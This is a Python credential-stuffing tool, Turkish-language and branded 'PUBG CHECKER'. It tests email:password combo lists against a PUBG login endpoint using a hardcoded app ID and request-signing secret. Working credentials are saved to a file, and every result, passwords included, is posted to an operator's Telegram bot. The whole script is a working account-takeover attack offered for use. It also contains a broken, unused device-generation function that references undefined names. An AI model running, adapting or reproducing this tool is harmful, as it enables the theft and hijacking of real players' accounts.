import requests
import hashlib
import random
import string
import time

A = "\033[1;91m"
B = "\033[1;96m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
L = "\033[1;95m"
M = "\033[1;94m"
Z = "\033[1;4m"

r = requests.session()
print("""\033[93m
██████╗ ██╗   ██╗██████╗  ██████╗
██╔══██╗██║   ██║██╔══██╗██╔════╝ 
██████╔╝██║   ██║██████╔╝██║  ███╗
██╔═══╝ ██║   ██║██╔══██╗██║   ██║
██║     ╚██████╔╝██████╔╝╚██████╔╝
╚═╝      ╚═════╝ ╚═════╝  ╚═════╝ 
              """)
       
print(f"                                                                                     {B}\n╔═══════════════════════╗\n{L}║{A} PUBG {E}CHECKER {H}HOŞ {Z} GELDİN\n{M}╚════════════════════                                                                                                                                                                                 ")

print(f"{E}    By{L}: {B}{A}| {E} {L}: {B}{M} => @tehlikeliadam")      

ID = input('\033[96mID Girin: ')
token = input('\033[94mBot Token Girin: ')



mendo = ["Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv", "Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817", "Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv", "Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv", "Linux; Android 9; SM-G973U Build/PPR1.180610.011", "Linux; Android 8.0.0; SM-G960F Build/R16NW", "Linux; Android 7.0; SM-G892A Build/NRD90M; wv", "Linux; Android 7.0; SM-G930VC Build/NRD90M; wv", "Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv", "Linux; Android 6.0.1; SM-G920V Build/MMB29K", "Linux; Android 5.1.1; SM-G928X Build/LMY47X"]


headPUB = {
    "Content-Type": "application/json; charset=utf-8",
    "User-Agent": f"Dalvik/2.1.0 {random.choice(mendo)}",
    "Host": "igame.msdkpass.com",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Length": "126"
}

def gen_device(self):
        did = uuid.uuid4()
        dinfo = quote(f"1|28602|{random.choice(mendo_device)}|tr|2.6.0|{int(time.time() * 1000)}|1.5|1280*730|google")
        
basarili_hesaplar = 0
gecersiz_hesaplar = 0
sahte_hesaplar = 0

def CHECK(email, password):
    global basarili_hesaplar
    global gecersiz_hesaplar
    global sahte_hesaplar

    eml = email.split(":")[0]
    pas = email.split(":")[1]
    YES = f""" \033[92mBaşarılı: {eml}:{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    NO = f""" \033[91mGeçersiz: {eml}:{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    SAHTE = f""" \033[94mSahte: {eml}:{pas}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
    
    pes = hashlib.md5(bytes(f'{password}', encoding='utf-8')).hexdigest()
    J = hashlib.md5(bytes("/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}3ec8cd69d71b7922e2a17445840866b26d86e283", encoding="utf-8")).hexdigest()
    url = f"https://igame.msdkpass.com/account/login?account_plat_type=3&appid=dd921eb18d0c94b41ddc1a6313889627&lang_type=tr_TR&os=1&sig={J}"
    daPU = "{\"account\":\""+eml+"\",\"account_type\":1,\"area_code\":\"\",\"extra_json\":\"\",\"password\":\""+pes+"\"}"
    time.sleep(0.5)
    GO = r.get(url, data=daPU, headers=headPUB).text
    
    if '"token"' in GO:
        print(YES)
        r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\n')
        with open('basarili.txt', 'a') as x:
            x.write(eml+':'+pas+'\n')
        basarili_hesaplar += 1
    elif 'Fake' in GO:
        print(SAHTE)
        r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={SAHTE}\n')
        with open('sahte.txt', 'a') as x:
            x.write(eml+':'+pas+'\n')
        sahte_hesaplar += 1
    else:
        print(NO)
        r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={NO}\n')
        with open('gecersiz.txt', 'a') as x:
            x.write(eml+':'+pas+'\n')
        gecersiz_hesaplar += 1

def FILname():
    global basarili_hesaplar
    global gecersiz_hesaplar
    global sahte_hesaplar

    F = input('\033[95mLütfen Geçerli Combo Girin: ')
    try:
        for x in open(F,'r').read().splitlines():
            email = x
            password = x.split(":")[1]
            CHECK(email, password)
    except FileNotFoundError:
        print('\033[91m\nBöyle Combo Bulunamadı!\n')
        return FILname()

FILname()

print(f"{E} Toplam Başarılı Hesaplar: {basarili_hesaplar}")
print(f"{A} Toplam Geçersiz Hesaplar: {gecersiz_hesaplar}\n{H}")